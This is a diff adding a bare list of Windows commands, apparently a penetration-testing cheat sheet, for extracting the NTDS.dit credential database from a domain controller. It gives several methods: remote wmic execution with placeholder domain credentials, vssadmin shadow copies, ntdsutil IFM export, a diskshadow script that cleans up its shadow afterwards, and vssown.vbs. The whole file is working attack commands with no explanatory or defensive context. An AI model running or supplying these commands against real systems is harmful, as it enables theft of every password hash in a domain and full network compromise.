@@ -1,0 +1,31 @@
+wmic /node:<<dc>> /user:<<Domain\user>> /password:<<password>> process call create "cmd /c vssadmin create shadow /for=C: 2>&1"
+wmic /node:<<dc>> /user:<<Domain\user>> /password:<<password>> process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\ntds.dit 2>&1"
+
+
+ntdsutil
+activate instance ntds
+ifm
+create full C:\ntdsutil
+quit
+quit
+
+
+set context persistent nowriters
+add volume c: alias someAlias
+create
+expose %someAlias% z:
+exec "cmd.exe" /c copy z:\windows\ntds\ntds.dit c:\temp\ntds.dit
+delete shadows volume %someAlias%
+reset
+
+diskshadow.exe /s c:\diskshadow.txt
+
+
+vssadmin create shadow /for=C:
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\
+
+cscript vssown.vbs /start
+cscript vssown.vbs /create c
+cscript vssown.vbs /list
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy11\windows\ntds\ntds.dit C:\temp
+cscript vssown.vbs /delete 
